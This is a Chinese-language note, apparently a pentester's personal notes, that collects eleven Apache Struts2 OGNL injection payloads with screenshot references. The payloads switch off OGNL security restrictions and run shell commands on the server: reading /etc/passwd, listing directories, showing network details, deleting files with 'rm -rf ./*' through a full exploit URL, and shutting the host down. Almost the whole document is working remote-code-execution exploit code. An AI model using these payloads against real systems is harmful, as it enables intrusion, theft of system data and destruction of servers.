<!-- Authorized by Frank -->

# 重写 payload

```js
// 1
%{"userDir{" + @java.lang.System@getProperty("user.dir") + "}"} 
```
![](./rewrite-payload-imgs/01.png)

```js
// 2
%{"osName{" + @java.lang.System@getProperty("os.name") + "}"} 
```

```js
// 3
%{"javaHome{" + @java.lang.System@getProperty("java.home") + "}"} 
```

```js
// 4 获取密码 (密文)
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "head -3 /etc/passwd"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```
![](./rewrite-payload-imgs/04.png)

```properties
# 5 rm -rf ./* (只测了长亭，靶机没试)
http://www.glassy.com/test.action?('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(a)(b)&('\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET')(a)(b)&('\u0023_memberAccess.allowStaticMethodAccess\u003dfalse')(a)(b)&('\u0040java.lang.Runtime@getRuntime().exec(\'/bin/bash\u0020-c\u0020rm\u0020-rf\u0020./*\')')(a)(b)
```
![](./rewrite-payload-imgs/05.png)

```js
// 6 打印路径
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('pwd').getInputStream()),#q}
```
![](./rewrite-payload-imgs/06.png)

```js
// 7 输出网卡相关信息 (可能不成功，ifconfig 需要安装 net-tools)
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "ifconfig"})).start().getInputStream(),#b=new java.io.BufferedReader(new java.io.InputStreamReader(#a)),#c=new char[50000],#b.read(#c),#d=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#d.getWriter().println(new java.lang.String(#c)),#d.getWriter().flush(),#d.getWriter().close()}
```
![](./rewrite-payload-imgs/07.png)

```js
// 8 输出当前文件夹列表
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "ls -als"})).start().getInputStream(),#b=new java.io.BufferedReader(new java.io.InputStreamReader(#a)),#c=new char[50000],#b.read(#c),#d=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#d.getWriter().println(new java.lang.String(#c)),#d.getWriter().flush(),#d.getWriter().close()}
```
![](./rewrite-payload-imgs/08.png)

```js
// 9 连续执行指令
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"/bin/bash", "-c", "cd ~ && ls -als"})).start().getInputStream(),#b=new java.io.BufferedReader(new java.io.InputStreamReader(#a)),#c=new char[50000],#b.read(#c),#d=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#d.getWriter().println(new java.lang.String(#c)),#d.getWriter().flush(),#d.getWriter().close()}
```
![](./rewrite-payload-imgs/09_1.png)  
![](./rewrite-payload-imgs/09_2.png)

```js
// 10 root 用户下执行关机 (靶机没试)
${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),@java.lang.Runtime@getRuntime().exec('shutdown -h now')}
```
![](./rewrite-payload-imgs/10.png)

```js
// 11 
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("ls -a").getInputStream())).(#q)}
```
![](./rewrite-payload-imgs/11.png)